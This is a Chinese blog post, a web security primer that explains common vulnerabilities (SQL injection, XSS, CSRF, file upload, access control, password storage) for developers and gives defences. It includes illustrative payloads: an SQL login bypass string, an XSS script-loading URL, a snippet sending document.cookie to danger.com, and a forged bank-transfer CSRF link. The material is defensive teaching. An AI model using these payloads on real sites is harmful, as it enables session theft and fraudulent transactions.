
---
title: 'Web安全实践'
categories: 
 - 编程
 - 掘金
 - 标签
headimg: 'https://picsum.photos/400/300?random=5838'
author: 掘金
comments: false
date: Mon, 03 May 2021 09:18:14 GMT
thumbnail: 'https://picsum.photos/400/300?random=5838'
---

<div>   
<div class="markdown-body"><style>.markdown-body&#123;position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#282d36&#125;.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6&#123;line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px&#125;.markdown-body h1&#123;font-size:30px;margin-bottom:5px;color:#2f845e&#125;.markdown-body h2&#123;font-size:24px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)&#125;.markdown-body h2:before&#123;content:" ";display:inline-block;width:8px&#125;.markdown-body h2:after&#123;content:" ";position:absolute;display:block;width:calc(100% - 40px);border-bottom:3px solid #2f845e&#125;.markdown-body h3&#123;font-size:18px;padding-bottom:0&#125;.markdown-body h4&#123;font-size:16px&#125;.markdown-body h5&#123;font-size:15px&#125;.markdown-body h6&#123;margin-top:5px&#125;.markdown-body p&#123;line-height:inherit;margin-top:22px;margin-bottom:22px&#125;.markdown-body img&#123;max-width:100%;box-shadow:6px 6px 6px #888&#125;.markdown-body hr&#123;border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px&#125;.markdown-body code&#123;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em&#125;.markdown-body code,.markdown-body pre&#123;font-family:Menlo,Monaco,Consolas,Courier New,monospace&#125;.markdown-body pre&#123;overflow:auto;position:relative;line-height:1.75;border-top:6px solid #2f845e&#125;.markdown-body pre>code&#123;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important&#125;.markdown-body strong&#123;background-color:inherit;color:#2f845e&#125;.markdown-body em&#123;background-color:inherit;color:#949415&#125;.markdown-body a&#123;text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64&#125;.markdown-body a:active,.markdown-body a:hover&#123;color:#3f9e64&#125;.markdown-body a[class^=footnote]&#123;margin-left:4px&#125;.markdown-body table&#123;display:inline-block!important;font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54&#125;.markdown-body thead&#123;background:#2f8e54;color:#fff;text-align:left;font-weight:700&#125;.markdown-body tr:nth-child(2n)&#123;background-color:rgba(153,255,188,.1)&#125;.markdown-body td,.markdown-body th&#123;width:100%;padding:12px 7px;line-height:24px&#125;.markdown-body td&#123;min-width:120px&#125;.markdown-body blockquote&#123;padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:4px&#125;.markdown-body blockquote:after&#123;display:block;content:""&#125;.markdown-body blockquote>p&#123;margin:10px 0&#125;.markdown-body ol,.markdown-body ul&#123;padding-left:28px&#125;.markdown-body ol li,.markdown-body ul li&#123;margin-bottom:0;list-style:inherit&#125;.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item&#123;list-style:none&#125;.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul&#123;margin-top:0&#125;.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul&#123;margin-top:3px&#125;.markdown-body ol li&#123;padding-left:6px&#125;.markdown-body del&#123;color:#2f845e&#125;@media (max-width:720px)&#123;.markdown-body h1&#123;font-size:24px&#125;.markdown-body h2&#123;font-size:20px&#125;.markdown-body h3&#123;font-size:18px&#125;&#125;</style><h1 data-id="heading-0">前言</h1>
<p>安全无小事，成败在细节，网络有风险，灾难弹指间。</p>
<p>安全一般情况下看不见，在你周围漂浮着，显现出来后，往往会刻骨铭心。正因为安全看不见，所以往往不受重视，因为感知到的概率真的太低，用户的第一感知是他看得见、摸得着、嗅得到、品得出的东西，实实在在的东西，而不是那种虚无缥缈的东西，我们对概率低的东西往往默认选择忽略。</p>
<h1 data-id="heading-1">编码安全</h1>
<h2 data-id="heading-2">反序列化命令执行</h2>
<p>暴露或间接暴露反序列化API，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。</p>
<p>最典型的就是fastjson了，有一段时间，fastjson被爆出过多次存在漏洞，很多文章报道了这件事儿，并且给出了升级建议。fastjson在反序列化时会调用目标类的setter方法，那么如果黑客在JdbcRowSetImpl的dataSourceName中设置了一个想要执行的命令，那么就会导致很严重的后果远程命令执行漏洞，即利用漏洞入侵到目标服务器，通过服务器执行命令。</p>
<p>所以针对这种开源框架及工具包，建议使用最新版本，避免被不法分子钻漏洞。</p>
<h2 data-id="heading-3">SQL 注入</h2>
<p>SQL注入漏洞是由于Web应用程序没有对用户输入数据的合法性进行判断，攻击者通过Web页面的输入区域(如URL、表单等) ，用精心构造的SQL语句插入特殊字符和指令，通过和数据库交互获得私密信息或者篡改数据库信息。SQL注入攻击在Web攻击中非常流行，攻击者可以利用SQL注入漏洞获得管理员权限，在网页上加挂木马和各种恶意程序，盗取企业和用户敏感信息。</p>
<p>比如登录的时候，用户输入了“admin' or 1=1 --”，</p>
<pre><code class="copyable">漏洞代码：select * from user where username='$&#123;username&#125;' and password=‘$&#123;password&#125;'
SQL 执行：select * from user where username=' admin' or 1=1 -- ' and password=null
<span class="copy-code-btn">复制代码</span></code></pre>
<p>防范措施</p>
<ul>
<li>使用预处理执行SQL语句</li>
<li>如果使用的是MyBatis，那么所有的变量必须使用#符号；如果特殊应用必须使用$的情况，必须确保变量完全来源于系统内部或代码定义好的固定常量</li>
<li>对于Order by或者表名、字段名等不能使用预处理的情况，研发人员可以在java层面做映射来进行解决</li>
</ul>
<h2 data-id="heading-4">跨站 XSS（Cross-site scripting）</h2>
<p>跨站脚本攻击发生在客户端，可被用于进行窃取隐私、钓鱼欺骗、窃取密码、传播恶意代码等攻击。</p>
<p>攻击者利用应用程序的动态展示数据功能，在html页面里嵌入恶意代码（如：“”）。当用户浏览该页之时，这些嵌入在html中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的。</p>
<p>一个钓鱼欺骗的例子，比如论坛里面有人回复了一条消息，假设用户贴了一张图片，src如下，</p>
<pre><code class="copyable">http://xxx.com/a.jpg\"\u003c/script\u003e\u003cscript type='text/javascript' src='http://danger.com/xxx.js' /\u003e"
其中“\u003c”对应“<”，“\u003e”对应“>”
<span class="copy-code-btn">复制代码</span></code></pre>
<p>一个盗取cookie的例子，同源策略不限制img标签，img可能是恶意网址的链接，那么可以构造一个看不见的img，然后把用户的cookie发送到恶意网址的服务器</p>
<pre><code class="copyable">var img=document.createElement("img");
img.src="http://danger.com/cookie=?"+escape(document.cookie);
document.body.appendChild(img);
<span class="copy-code-btn">复制代码</span></code></pre>
<p>安全编码建议，Java侧需要对非富文本采用escape转义，富文本采用owasp antisamy；在javascript内容中输出的“用户可控数据”，需要做javascript escape转义”，同时如果可以的话，给网站设置一个跳转的白名单。</p>
<p>Java代码如下</p>
<pre><code class="copyable">import cn.hutool.core.util.EscapeUtil;
import org.owasp.validator.html.AntiSamy;
import org.owasp.validator.html.CleanResults;
import org.owasp.validator.html.Policy;

public class Test &#123;

    public static void main(String[] args) &#123;
        String str = "abc<script>alert(\"hello\")</script>def";

        // 非富文本采用escape转义
        System.out.println("EscapeUtil:" + EscapeUtil.escape(str));

        // 富文本采用owasp antisamy
        AntiSamy antiSamy = new AntiSamy();
        try &#123;
            Policy policy = Policy.getInstance(Test.class.getClassLoader()
                    .getResourceAsStream("antisamy-anythinggoes.xml"));
            CleanResults results = antiSamy.scan(str, policy);
            System.out.println("AntiSamy:" + results.getCleanHTML());
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;

    &#125;

&#125;

<span class="copy-code-btn">复制代码</span></code></pre>
<h2 data-id="heading-5">跨站请求伪造 CSRF（Cross-site request forgery）</h2>
<p>攻击者在用户浏览网页时，利用页面元素（例如img的src），强迫受害者的浏览器向Web应用程序发送一个改变用户信息的请求。</p>
<p>比如一个用户的会话cookie在浏览器没有关闭的时候，是不会被删除的，所以可以换个思路，不再去偷这个cookie了，相反，可以在web.com中构造一个领奖页面，里面包含一个连接，让用户去点击，例如：</p>
<pre><code class="copyable">恭喜你获得了iPhoneX一台，快来<a href="www.icbc.com.cn/transfer?toBankId=黑客的账户&money=金额">领取吧</a>
<span class="copy-code-btn">复制代码</span></code></pre>
<p>这得先知道icbc.com.cn的转账操作的url和参数名称。
如果这个用户恰好登录了icbc.com，那他的cookie还在，当他禁不住诱惑，点了这个链接后，一个转账操作就神不知鬼不觉的发生了。</p>
<p>防范措施</p>
<ul>
<li>用户登陆时，设置一个CSRF的随机TOKEN，同时后续都在请求后面带上这个TOKEN</li>
<li>生成表单的同时，推送TOKEN值。表单提交，判断token是否一致，如果不一致或没有这个值，判断为CSRF攻击，并记录日志 ，如一致就放行，并重新生成下一个新的token</li>
<li>重要操作增加二次图片验证码或滑动验证码等</li>
<li>致命操作使用二次密码验证或人脸识别等</li>
</ul>
<h2 data-id="heading-6">URL跳转</h2>
<p>Web应用程序接收到用户提交的URL参数后，没有对参数做“可信任URL”的验证，就向用户浏览器返回跳转到该URL的指令。一般发生在登录授权的回调地址那里。</p>
<p>防范措施，添加跳转白名单，判断目的地址是否在白名单列表中，如果不在列表中，就判定为URL跳转攻击。</p>
<h1 data-id="heading-7">文件安全</h1>
<h2 data-id="heading-8">任意文件上传</h2>
<p>文件上传漏洞通常由于网页代码中的文件上传路径变量过滤不严造成的，如果文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。</p>
<p>防范措施</p>
<ul>
<li>检查上传文件扩展名白名单，不属于白名单内，不允许上传。</li>
<li>上传文件的目录必须是http请求无法直接访问到的。如果需要访问的，必须上传到其他（和web服务器不同的）域名下，并设置该目录为不解析jsp等脚本语言的目录。</li>
<li>图片上传，要通过处理（缩略图、水印等），无异常后才能保存到服务器。</li>
</ul>
<h2 data-id="heading-9">任意文件下载</h2>
<p>处理用户请求下载文件时，允许用户提交任意文件路径，并把服务器上对应的文件直接发送给用户，这将造成任意文件下载威胁。如果让用户提交文件目录地址，就把目录下的文件列表发给用户，会造成目录遍历安全威胁。</p>
<p>防范措施</p>
<ul>
<li>文件路径保存至数据库，让用户提交文件对应ID下载文件</li>
<li>下载文件之前做权限判断</li>
<li>不允许提供目录遍历服务</li>
</ul>
<h1 data-id="heading-10">权限安全</h1>
<h2 data-id="heading-11">垂直权限安全/纵向越权</h2>
<p>由于应用程序没有做鉴权，或鉴权做的比较粗，导致的恶意用户可以通过穷举遍历管理页面的URL，就可以访问或控制其他角色拥有的数据或管理功能，达到权限提升目的。</p>
<p>可以采用细粒度鉴权策略，判断当前用户是否拥有功能的权限。</p>
<h2 data-id="heading-12">水平权限安全/横向越权</h2>
<p>应用程序根据用户提交的ID（如订单id、用户id、商品id等），在没有校验身份的情况下，直接返回用户信息，从而会造成攻击者越权遍历所有其他用户信息的问题。</p>
<p>涉及到用户数据的操作应进行严格的身份校验，可以从服务端登录态cookie或session信息中取值校验，禁止通过用户提交的ID信息直接进行数据操作。</p>
<h1 data-id="heading-13">信息安全</h1>
<h2 data-id="heading-14">密码</h2>
<p>过去一段时间来, 众多的网站遭遇用户密码数据库泄露事件。层出不穷的类似事件对用户会造成巨大的影响，因为人们往往习惯在不同网站使用相同的密码，一家 “暴库”，全部遭殃。</p>
<p>在用户设置密码时，需要校验密码的强度，要数字、密码、特殊符号，且6位以上。</p>
<p>同时在网络传输上，也要注意进行加密传输。</p>
<p>在密码的存储上，一定不能存储明文，需要进行加密存储，这其中经过一系列的存储加密升级。</p>
<p>单纯的MD5或sha算法加密，看起来很安全，没法被破解，但是有了字典表/彩虹表破解的手段，破解出来就是很简单的事了，具体可以看<a href="https://www.cmd5.com/" target="_blank" rel="nofollow noopener noreferrer">MD5 解密查询的网站上</a>，如果你的密码很简单，加密后的 MD5 密文都能反查出原始密码来。</p>
<p>早期为了改进单向hash的缺陷，为了让彩虹表失效，引入了盐，盐是随机生成的一个唯一字符串，连在明文密码后增强密码的随机性，然后再做hash得到的加密密文存储在db中，这样一个是相同的密码存在db中的值就不同了，另一个是彩虹表也不会再起作用了。但是同样以目前计算机的算力，暴力破解也是分分钟的事情。</p>
<p>PBKDF2/BCrypt/SCrypt 算法，这几种算法有一个特点，算法中都有个因子，用于指明计算密码摘要所需要的资源和时间，也就是计算强度。计算强度越大，攻击者建立rainbow table越困难，以至于不可继续。这类算法也可以保证即使计算能力不断提高，只要调整算法中的强度因子，密码仍然不可能被轻易的攻破。</p>
<h2 data-id="heading-15">个人敏感信息</h2>
<p>典型的如用户的身份证跟手机号，现在很多网站，只要一个身份证跟手机号，就拥有了很多权限，对于这部分信息的存储，也需要注意加密，且不能只使用简单的加密算法，特别不要将编码(如Base64)和密码算法混为一谈，前者不是密码算法。不要使用DES等低强度的密码算法，使用AES等高强度的加密算法。</p>
<h2 data-id="heading-16">验证码安全</h2>
<p>登陆、注册、短信验证、邮件验证等api往往会成为攻击者撞库、轰炸的目标。
在登陆、注册、短信发送、邮件发送必须加入图片验证码，同时验证码必须设置有效期和有效次数（一般为一次性），使用短信、邮件验证时，必须限制同一ID或接收者的验证码发送频率。</p>
<h1 data-id="heading-17">参考资料</h1>
<ul>
<li>《白帽子讲Web安全》——吴翰清</li>
<li><a href="https://www.cnblogs.com/hollischuang/p/13253321.html" target="_blank" rel="nofollow noopener noreferrer">fastjson到底做错了什么？为什么会被频繁爆出漏洞？</a></li>
<li><a href="https://www.cnblogs.com/yzloo/p/10391078.html" target="_blank" rel="nofollow noopener noreferrer">十大常见web漏洞</a></li>
<li><a href="https://www.cnblogs.com/alisecurity/p/5780648.html" target="_blank" rel="nofollow noopener noreferrer">互联网业务安全之通用安全风险模型</a></li>
<li><a href="https://segmentfault.com/a/1190000013022789" target="_blank" rel="nofollow noopener noreferrer">Web安全防范(XSS、CSRF)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/69979644" target="_blank" rel="nofollow noopener noreferrer">一分钟让你了解拖库、洗库和撞库</a></li>
<li><a href="https://www.cnblogs.com/sunxuchu/p/5483956.html" target="_blank" rel="nofollow noopener noreferrer">各种加密算法比较</a></li>
</ul></div>  
</div>
            